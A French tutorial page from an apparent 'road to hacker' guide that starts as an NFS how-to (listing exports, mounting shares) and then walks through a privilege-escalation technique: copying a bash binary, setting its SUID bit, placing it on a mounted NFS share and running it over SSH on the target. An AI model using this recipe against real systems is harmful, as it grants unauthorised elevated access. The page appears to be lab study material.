# NFS

### NFS (Network File System)

NFS (Network File System) est un protocole utilisé pour partager des fichiers et des répertoires entre différents systèmes sur un réseau. Voici un guide complet pour interagir avec des partages NFS.

***

### **1. Découvrir les Partages NFS Disponibles**

Pour lister les partages disponibles sur une machine distante :

```bash
/usr/sbin/showmount -e [IP machine distante]
```

**Explication :**\
`showmount -e` affiche les répertoires exportés (partages NFS) disponibles sur la machine distante.

***

### **2. Créer un Point de Montage**

Avant de monter un partage NFS, créez un répertoire local qui servira de point de montage :

```bash
mkdir /tmp/mount
```

**Explication :**\
Ce répertoire sera utilisé pour accéder au contenu partagé par le serveur NFS.

***

### **3. Monter un Partage NFS**

Pour connecter un partage NFS à votre point de montage :

```bash
sudo mount -t nfs [IP machine distante]:[répertoire partagé] /tmp/mount -nolock
```

**Explication :**

* `-t nfs` : Indique que le système de fichiers est de type NFS.
* `[IP machine distante]:[répertoire partagé]` : Spécifie l’adresse IP du serveur et le répertoire partagé.
* `/tmp/mount` : Point de montage local sur votre machine.
* `-nolock` : Désactive le verrouillage des fichiers, utile pour éviter certains conflits avec NFS.

***

### **4. Transférer des Fichiers via SCP**

Pour récupérer un fichier (comme un exécutable `bash`) depuis une machine distante :

```bash
scp -i id_rsa [utilisateur]@[IP distante]:/chemin/vers/fichier ~/Téléchargements/
```

**Exemple :**

```bash
scp -i id_rsa cappucino@10.10.72.89:/bin/bash ~/Downloads/bash
```

**Explication :**

* `scp` : Utilitaire de copie sécurisée.
* `-i id_rsa` : Utilise une clé privée pour s’authentifier.
* `[utilisateur]@[IP distante]:[chemin fichier]` : Spécifie la machine distante, l’utilisateur, et le fichier à récupérer.
* `~/Téléchargements/` : Chemin local où le fichier sera sauvegardé.

***

### **5. Modifier les Droits sur le Fichier**

Pour définir le bit `suid` sur un fichier (ce qui permet d'exécuter le fichier avec les privilèges de son propriétaire) :

```bash
chmod +s bash
```

**Explication :**

* `+s` : Ajoute le bit `setuid`, permettant au fichier d’hériter des privilèges de l’utilisateur propriétaire.

***

### **6. Déplacer le Fichier sur le Partage NFS**

Déplacez le fichier modifié vers le partage monté :

```bash
mv ~/Downloads/bash /tmp/mount/[utilisateur]
```

***

### **7. Exécuter le Fichier sur la Machine Cible**

Reconnectez-vous à la machine distante en SSH et exécutez le fichier transféré :

```bash
ssh -i id_rsa [utilisateur]@[IP distante]
./bash
```

**Explication :**

* `ssh` : Accès à distance à la machine.
* `./bash` : Lance l’exécutable `bash` sur la machine distante avec les droits définis.

***

**Liens utiles :**

* [Mentions légales](https://dika-1.gitbook.io/road-to-hacker/mentions-legales)
* [Politique de confidentialité](https://dika-1.gitbook.io/road-to-hacker/politique-de-confidentialite)
* [Contactez-nous](mailto:dika-road-to-hacker@protonmail.com)
